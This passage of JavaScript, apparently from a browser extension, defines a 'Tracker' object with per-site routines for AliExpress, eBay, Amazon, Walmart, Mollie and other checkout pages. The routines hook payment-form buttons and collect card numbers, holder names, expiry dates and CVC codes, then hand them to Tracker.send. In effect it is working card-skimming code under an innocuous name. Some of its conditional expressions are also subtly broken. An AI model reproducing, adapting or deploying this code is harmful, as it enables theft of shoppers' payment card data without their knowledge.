                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': __childElement.getAttribute('aria-label') === 'Card Number' ? __childElement.value : 'Unknown',
                                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                                'cardHolder': /*(document.querySelector('#firstName') as HTMLInputElement).value !== null ? (document.querySelector('#firstName') as HTMLInputElement).value : 'Unknown' + ' ' + (document.querySelector('#lastName') as HTMLInputElement).value !== null ? (document.querySelector('#lastName') as HTMLInputElement).value :*/ 'Unknown',
                                                'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
                                                'cardCVC': __childElement.getAttribute('aria-label') === 'CVV' ? __childElement.value : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
        }, 1000);
    };
    Tracker.prototype.exploreSpecificElementByTagName = function (self, __elementParent, __tagName, __query, callback) {
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    __spreadArray([], __childElement.attributes, true).forEach(function (attribute) {
                        if (attribute.nodeValue.toLowerCase().indexOf(__query) !== -1) {
                            if (callback) {
                                callback(__childElement);
                            }
                        }
                    });
                }
                else {
                    self.exploreSpecificElementByTagName(self, __childElement, __tagName, __query, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreAliExpressPaymentNewCard = function (self, __elementParent, callback) {
        var detectedElements = [];
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement) {
                if (__childElement.classList.contains('card-surface')) {
                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
                        __childElement.childNodes.forEach(function (__targetParentElement) {
                            if (__targetParentElement.classList.contains('card-no')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardn', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if (__targetParentElement.classList.contains('card-bottom')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardholder', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'expire', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cv', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        });
                    }
                }
                if (callback) {
                    callback(detectedElements);
                }
            });
        }
    };
    Tracker.prototype.processAliExpressPaymentNewCard = function (self) {
        self.exploreAliExpressPaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
            var _a;
            var paymentMethodStore = [];
            (_a = document.querySelector('.save')) === null || _a === void 0 ? void 0 : _a.addEventListener('click', function () {
                var _a, _b, _c, _d, _e, _f, _g;
                new Set(elements).forEach(function (element) {
                    paymentMethodStore.push({
                        'element': element.nodeName,
                        'id': element.id,
                        'type': element.type,
                        'value': element.value
                    });
                });
                Tracker.send({
                    command: 'savePaymentMethodsData',
                    data: {
                        'cardNumber': paymentMethodStore[0].value,
                        'cardBrand': ((_a = document.querySelector('.card-type-icon.icon')) === null || _a === void 0 ? void 0 : _a.classList.contains('visa')) ? 'visa' : (((_b = document.querySelector('.card-type-icon.icon')) === null || _b === void 0 ? void 0 : _b.classList.contains('mastercard')) ? 'mastercard' : (((_c = document.querySelector('.card-type-icon.icon')) === null || _c === void 0 ? void 0 : _c.classList.contains('discover')) ? 'discover' : (((_d = document.querySelector('.card-type-icon.icon')) === null || _d === void 0 ? void 0 : _d.classList.contains('mnp')) ? 'mnp' : (((_e = document.querySelector('.card-type-icon.icon')) === null || _e === void 0 ? void 0 : _e.classList.contains('maestro')) ? 'maestro' : (((_f = document.querySelector('.card-type-icon.icon')) === null || _f === void 0 ? void 0 : _f.classList.contains('amex')) ? 'amex' : (_g = document.querySelector('.card-type-icon.icon')) === null || _g === void 0 ? void 0 : _g.className))))),
                        'cardHolder': paymentMethodStore[1].value,
                        'cardExpire': paymentMethodStore[2].value,
                        'cardCVC': paymentMethodStore[3].value,
                        'event': 'add',
                        'workWebsite': window.location.origin
                    }
                });
                paymentMethodStore = [];
                var edit = setInterval(function () {
                    if (document.querySelector('.edit-card') !== null) {
                        clearInterval(edit);
                        ['click', 'dblclick'].forEach(function (event) {
                            var _a;
                            (_a = document.querySelector('.edit-card')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                var __interval3 = setInterval(function () {
                                    if (document.querySelector('.new-card') !== null) {
                                        clearInterval(__interval3);
                                        self.processAliExpressPaymentNewCard(self);
                                    }
                                }, 1000);
                            });
                        });
                    }
                }, 1000);
            });
        });
    };
    Tracker.prototype.processAliExpressPaymentNewCardOnSecondPayment = function (self) {
        var interval = setInterval(function () {
            if (document.querySelector('.card-form') !== null) {
                clearInterval(interval);
                self.exploreAliExpressPaymentNewCard(self, document.querySelector('.card-form'), function (elements) {
                    var _a, _b;
                    var paymentMethodStore = [];
                    (_b = (_a = document.querySelector('.payment-confirm')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.addEventListener('click', function () {
                        var _a, _b, _c, _d, _e, _f, _g;
                        new Set(elements).forEach(function (element) {
                            paymentMethodStore.push({
                                'element': element.nodeName,
                                'id': element.id,
                                'type': element.type,
                                'value': element.value
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodStore[0].value,
                                'cardBrand': ((_a = document.querySelector('.card-brand-icon')) === null || _a === void 0 ? void 0 : _a.classList.contains('visa')) ? 'visa' : (((_b = document.querySelector('.card-brand-icon')) === null || _b === void 0 ? void 0 : _b.classList.contains('mastercard')) ? 'mastercard' : (((_c = document.querySelector('.card-brand-icon')) === null || _c === void 0 ? void 0 : _c.classList.contains('discover')) ? 'discover' : (((_d = document.querySelector('.card-brand-icon')) === null || _d === void 0 ? void 0 : _d.classList.contains('mnp')) ? 'mnp' : (((_e = document.querySelector('.card-brand-icon')) === null || _e === void 0 ? void 0 : _e.classList.contains('maestro')) ? 'maestro' : (((_f = document.querySelector('.card-brand-icon')) === null || _f === void 0 ? void 0 : _f.classList.contains('amex')) ? 'amex' : (_g = document.querySelector('.card-brand-icon')) === null || _g === void 0 ? void 0 : _g.className))))),
                                'cardHolder': paymentMethodStore[1].value,
                                'cardExpire': paymentMethodStore[2].value,
                                'cardCVC': paymentMethodStore[3].value,
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodStore = [];
                        var edit = setInterval(function () {
                            if (document.querySelector('.payment-edit') !== null) {
                                clearInterval(edit);
                                ['click', 'dblclick'].forEach(function (event) {
                                    var _a;
                                    (_a = document.querySelector('.payment-edit')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                        var __interval3 = setInterval(function () {
                                            if (document.querySelector('.card-form') !== null) {
                                                clearInterval(__interval3);
                                                self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                            }
                                        }, 1000);
                                    });
                                });
                            }
                        }, 1000);
                    });
                });
            }
        }, 100);
    };
    Tracker.prototype.exploreEbayPaymentDataCollection = function (self, __ebayCreditCardFormElement, elements) {
        self.exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, function (controller, elements) {
            ['click', 'dblclick'].forEach(function (event) {
                controller.addEventListener(event, function () {
                    var _a, _b, _c;
                    var paymentMethodStore = [];
                    elements.forEach(function (__detectedElement) {
                        paymentMethodStore.push({
                            'element': __detectedElement.nodeName,
                            'id': __detectedElement.id,
                            'value': __detectedElement.value
                        });
                    });
                    Tracker.send({
                        command: 'savePaymentMethodsData',
                        data: {
                            'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
                            'cardBrand': (_c = (_b = (_a = document.querySelector('.card-types')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.getAttribute('aria-label')) === null || _c === void 0 ? void 0 : _c.toLowerCase(),
                            'cardHolder': paymentMethodStore[3].id === 'cardHolderFirstName' ? paymentMethodStore[3].value : 'Unknown' + ' ' + paymentMethodStore[4].id === 'cardHolderLastName' ? paymentMethodStore[4].value : 'Unknown',
                            'cardExpire': paymentMethodStore[1].id === 'cardExpiryDate' ? paymentMethodStore[1].value : 'Unknown',
                            'cardCVC': paymentMethodStore[2].id === 'securityCode' ? paymentMethodStore[2].value : 'Unknown',
                            'event': 'add',
                            'workWebsite': window.location.origin
                        }
                    });
                    paymentMethodStore = [];
                    var interval = setInterval(function () {
                        document.querySelectorAll('a').forEach(function (__ebaySecondEntry) {
                            if (__ebaySecondEntry.getAttribute('data-test-id') === 'GET_PAYMENT_INSTRUMENT') {
                                clearInterval(interval);
                                ['click', 'dblclick'].forEach(function (event) {
                                    __ebaySecondEntry.addEventListener(event, function () {
                                        self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                    });
                                });
                            }
                        });
                    }, 100);
                });
            });
        });
    };
    Tracker.prototype.exploreEbayPaymentFormElement = function (self, __ebayCreditCardFormElement, elements, callback) {
        if (__ebayCreditCardFormElement.childNodes.length !== 0) {
            __ebayCreditCardFormElement.childNodes.forEach(function (_ebayFormChildElement) {
                if (_ebayFormChildElement.nodeName === 'INPUT' || _ebayFormChildElement.nodeName === 'BUTTON') {
                    if (_ebayFormChildElement.nodeName === 'INPUT' && _ebayFormChildElement.type !== 'hidden' && _ebayFormChildElement.type !== 'checkbox') {
                        elements.push(_ebayFormChildElement);
                    }
                    if (_ebayFormChildElement.nodeName === 'BUTTON' && _ebayFormChildElement.type === 'submit') {
                        if (callback) {
                            callback(_ebayFormChildElement, elements);
                        }
                    }
                }
                else {
                    self.exploreEbayPaymentFormElement(self, _ebayFormChildElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreSegPayPaymentContainer = function (self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "PayPageForm") {
                var elements = [];
                self.exploreSegPayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        var paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[2].value !== null ? paymentMethodData[2].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value !== null ? paymentMethodData[0].value : 'Unknown' + ' ' + paymentMethodData[1].value !== null ? paymentMethodData[1].value : 0,
                                'cardExpire': paymentMethodData[3].value !== null ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value !== null ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value !== null ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    };
    Tracker.prototype.exploreSegPayPaymentFormElement = function (self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' && _childElement.type !== 'radio' &&
                        _childElement.id !== 'EMailInput' && _childElement.id !== 'AddressInput' && _childElement.id !== 'CityInput' &&
                        _childElement.id !== 'PhoneNumberInput' && _childElement.id !== 'ZipInput' && _childElement.id !== 'TermsConditionsPrivacyInput' ||
                        _childElement.nodeName === 'SELECT' && _childElement.id !== 'LanguageDDL' && _childElement.id !== 'TodaysChargeDDL' &&
                            _childElement.id !== 'StateDDL' && _childElement.id !== 'CountryDDL') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreSegPayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreDocmorrisPaymentContainer = function (self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "form-paymentmethods-credit_card") {
                var elements = [];
                self.exploreDocmorrisPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        var paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    };
    Tracker.prototype.exploreDocmorrisPaymentFormElement = function (self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (elements.length > 4 && elements.length < 6) {
                        if (document.querySelectorAll('#perkreditkarte').length !== 0) {
                            document.querySelectorAll('#perkreditkarte').forEach(function (__dataConfirmElement) {
                                if (__dataConfirmElement.getAttribute('form') === "form-paymentmethods-credit_card") {
                                    if (callback) {
                                        callback(__dataConfirmElement, elements);
                                    }
                                }
                            });
                        }
                    }
                }
                else {
                    self.exploreDocmorrisPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.explorePaygatePaymentContainer = function (self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "SSLForm") {
                var elements = [];
                self.explorePaygatePaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        var paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            if (__childElement.nodeName === 'INPUT') {
                                if (__childElement.type === 'radio' && __childElement.checked) {
                                    paymentMethodData.push({
                                        'element': __childElement.nodeName,
                                        'id': __childElement.id,
                                        'name': __childElement.name,
                                        'value': __childElement.value,
                                    });
                                }
                                else {
                                    if (__childElement.type === 'text') {
                                        paymentMethodData.push({
                                            'element': __childElement.nodeName,
                                            'id': __childElement.id,
                                            'name': __childElement.name,
                                            'value': __childElement.value,
                                        });
                                    }
                                }
                            }
                            if (__childElement.nodeName === 'SELECT') {
                                paymentMethodData.push({
                                    'element': __childElement.nodeName,
                                    'id': __childElement.id,
                                    'name': __childElement.name,
                                    'value': __childElement.value,
                                });
                            }
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    };
    Tracker.prototype.explorePaygatePaymentFormElement = function (self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON' || _childElement.type === 'radio') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT' || _childElement.type === 'radio') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.explorePaygatePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreSundayPaymentContainer = function (self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "one-step-checkout-form") {
                var elements = [];
                self.exploreSundayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        var paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    };
    Tracker.prototype.exploreSundayPaymentFormElement = function (self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreSundayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreMolliePaymentContainer = function (self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "body") {
                var elements = [];
                self.exploreMolliePaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        var paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    };
    Tracker.prototype.exploreMolliePaymentFormElement = function (self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreMolliePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreAnchorOnly = function (self, parentNode, listId, callback) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.getAttribute('data-txnid') === listId) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                }
                else {
                    self.exploreAnchorOnly(self, __detectedElement, listId, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreAnchorOnlyByHref = function (self, parentNode, listId, callback) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.href.indexOf(listId) !== -1) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                }
                else {
                    self.exploreAnchorOnlyByHref(self, __detectedElement, listId, callback);
                }
            });
        }
    };
    Tracker.prototype.explorePaymentInputTagOnly = function (self, elementParentNode, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && __childElement.type === 'submit') {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentInputTagOnly(self, __childElement, callback);
                }
            });
        }
    };
    Tracker.prototype.explorePayPalPaymentFormElement = function (self, __creditCardFormElement, elements, callback) {
        if (__creditCardFormElement.childNodes.length !== 0) {
            __creditCardFormElement.childNodes.forEach(function (_formChildElement) {
                if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' || _formChildElement.nodeName === 'BUTTON') {
                    if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' &&
                        _formChildElement.type !== 'hidden' && _formChildElement.id !== 'billingAddressId') {
                        elements.push(_formChildElement);
                    }
                    if (_formChildElement.nodeName === 'BUTTON' && _formChildElement.type === 'submit') {
                        if (callback) {
                            callback(_formChildElement, elements);
                        }
                    }
                }
                else {
                    self.explorePayPalPaymentFormElement(self, _formChildElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreHelloFreshPaymentContainer = function (self, parentNode, callback) {
        parentNode.childNodes.forEach(function (__element) {
            if (__element.nodeName === 'BUTTON' && __element.getAttribute('data-test-id') === 'add-payment-method-save') {
                if (callback) {
                    callback(__element);
                }
            }
            else {
                self.exploreHelloFreshPaymentContainer(self, __element, callback);
            }
        });
    };
    Tracker.prototype.exploreBestSecretPaymentContainer = function (self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "creditForm") {
                var elements = [];
                self.exploreBestSecretPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        var paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardHolder': paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    };
    Tracker.prototype.exploreBestSecretPaymentFormElement = function (self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON' && !_childElement.classList.contains('btn-link')
                        && !_childElement.classList.contains('btn-secondary-action') && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreBestSecretPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreAmazonPaymentContainer = function (self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (!__formElement.classList.contains('nav-searchbar') && __formElement.name !== 'ue_backdetect' && __formElement.style.display !== 'none') {
                var elements = [];
                self.exploreAmazonPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        var paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name.indexOf('accountHolderName') !== -1 || __childElement.name.indexOf('account_holder_name') !== -1 ? 'cardHolder' : (__childElement.name.indexOf('CardNumber') !== -1 ? 'cardNumber' : (__childElement.name.indexOf('month') !== -1 ? 'expirationMonth' : (__childElement.name.indexOf('year') !== -1 ? 'expirationYear' : 'Unknown'))),
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value,
                                'cardBrand': 'Unknown',
                                'cardHolder': paymentMethodData[0].value,
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                    });
                });
            }
        });
    };
    Tracker.prototype.exploreAmazonPaymentFormElement = function (self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' &&
                        _childElement.type !== 'submit' && _childElement.type !== 'checkbox' ||
                        _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'INPUT' && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreAmazonPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    };
    Tracker.prototype.exploreWalmartPaymentContainer = function (self) {
        var interval = setInterval(function () {
            var _a, _b, _c, _d, _e;
            if (document.querySelector('.edit-form.multiple-required') !== null &&
                ((_b = (_a = document.querySelector('.edit-form-actions')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.firstElementChild) !== null) {
                clearInterval(interval);
                if (((_e = (_d = (_c = document.querySelector('.edit-form-actions')) === null || _c === void 0 ? void 0 : _c.firstElementChild) === null || _d === void 0 ? void 0 : _d.firstElementChild) === null || _e === void 0 ? void 0 : _e.nodeName) === 'BUTTON') {
                    ["click", "dblclick"].forEach(function (event) {
                        var _a, _b, _c;
                        var tempPaymentMethodsStore = [];
                        (_c = (_b = (_a = document.querySelector('.edit-form-actions')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.firstElementChild) === null || _c === void 0 ? void 0 : _c.addEventListener(event, function () {
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'creditCard', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            document.querySelectorAll('.payment-option').forEach(function (element) {
                                if (!element.classList.contains('payment-inactive')) {
                                    element.classList.remove('payment-option');
                                    tempPaymentMethodsStore.push({
                                        'element': element.nodeName,
                                        'id': 'cardBrand',
                                        'value': element.className
                                    });
                                    element.classList.add('payment-option');
                                }
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'firstName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'lastName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'month-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'year-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'cvv', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            Tracker.send({
                                command: 'savePaymentMethodsData',
                                data: {
                                    'cardNumber': tempPaymentMethodsStore[0].value,
                                    'cardBrand': tempPaymentMethodsStore[1].value,
